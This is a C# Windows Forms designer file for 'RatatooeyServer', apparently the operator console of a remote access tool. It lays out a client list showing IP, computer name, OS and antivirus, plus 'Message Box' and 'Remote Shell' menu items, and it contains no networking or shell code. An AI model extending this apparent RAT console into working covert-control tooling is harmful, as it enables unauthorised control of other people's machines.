using RatatooeyServer.Properties;

namespace RatatooeyServer
{
	partial class FormServer
	{
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing)
		{
			if (disposing && (components != null))
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
			this.clientsList = new System.Windows.Forms.ListView();
			this.IP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
			this.ComputerName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
			this.OS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
			this.AV = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
			this.contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.administrationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.tableLayoutPanel1.SuspendLayout();
			this.contextMenuStrip.SuspendLayout();
			this.SuspendLayout();
			// 
			// tableLayoutPanel1
			// 
			this.tableLayoutPanel1.ColumnCount = 1;
			this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F));
			this.tableLayoutPanel1.Controls.Add(this.clientsList, 0, 1);
			this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.tableLayoutPanel1.Location = new System.Drawing.Point(0, 0);
			this.tableLayoutPanel1.Name = "tableLayoutPanel1";
			this.tableLayoutPanel1.RowCount = 2;
			this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 5.940594F));
			this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 94.0594F));
			this.tableLayoutPanel1.Size = new System.Drawing.Size(901, 512);
			this.tableLayoutPanel1.TabIndex = 0;
			this.tableLayoutPanel1.Paint += new System.Windows.Forms.PaintEventHandler(this.tableLayoutPanel1_Paint);
			// 
			// clientsList
			// 
			this.clientsList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.IP,
            this.ComputerName,
            this.OS,
            this.AV});
			this.clientsList.ContextMenuStrip = this.contextMenuStrip;
			this.clientsList.FullRowSelect = true;
			this.clientsList.GridLines = true;
			this.clientsList.HideSelection = false;
			this.clientsList.Location = new System.Drawing.Point(3, 33);
			this.clientsList.Name = "clientsList";
			this.clientsList.Size = new System.Drawing.Size(895, 458);
			this.clientsList.TabIndex = 0;
			this.clientsList.UseCompatibleStateImageBehavior = false;
			this.clientsList.View = System.Windows.Forms.View.Details;
			this.clientsList.SelectedIndexChanged += new System.EventHandler(this.clientsList_SelectedIndexChanged);
			this.clientsList.MouseClick += new System.Windows.Forms.MouseEventHandler(this.clientsList_MouseClick);
			// 
			// IP
			// 
			this.IP.Text = "IP";
			this.IP.Width = 232;
			// 
			// ComputerName
			// 
			this.ComputerName.Text = "Computer Name";
			this.ComputerName.Width = 186;
			// 
			// OS
			// 
			this.OS.Text = "OS";
			this.OS.Width = 153;
			// 
			// AV
			// 
			this.AV.Text = "AV";
			this.AV.Width = 165;
			// 
			// contextMenuStrip
			// 
			this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.administrationToolStripMenuItem,
            this.remoteShellToolStripMenuItem});
			this.contextMenuStrip.Name = "contextMenu";
			this.contextMenuStrip.Size = new System.Drawing.Size(181, 70);
			// 
			// administrationToolStripMenuItem
			// 
			this.administrationToolStripMenuItem.Name = "administrationToolStripMenuItem";
			this.administrationToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
			this.administrationToolStripMenuItem.Text = "Message Box";
			this.administrationToolStripMenuItem.Click += new System.EventHandler(this.administrationToolStripMenuItem_Click);
			// 
			// remoteShellToolStripMenuItem
			// 
			this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
			this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
			this.remoteShellToolStripMenuItem.Text = "Remote Shell";
			this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.shellToolStripMenuItem_Click);
			// 
			// FormServer
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.ClientSize = new System.Drawing.Size(901, 512);
			this.Controls.Add(this.tableLayoutPanel1);
			this.Name = "FormServer";
			this.Text = "Form1";
			this.Load += new System.EventHandler(this.FormServer_Load);
			this.tableLayoutPanel1.ResumeLayout(false);
			this.contextMenuStrip.ResumeLayout(false);
			this.ResumeLayout(false);

		}

		#endregion

		private System.Windows.Forms.TableLayoutPanel tableLayoutPanel1;
		private System.Windows.Forms.ContextMenuStrip contextMenuStrip;
		private System.Windows.Forms.ToolStripMenuItem administrationToolStripMenuItem;
		private System.Windows.Forms.ListView clientsList;
		private System.Windows.Forms.ColumnHeader IP;
		private System.Windows.Forms.ColumnHeader ComputerName;
		private System.Windows.Forms.ColumnHeader OS;
		private System.Windows.Forms.ColumnHeader AV;
		private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
	}
}

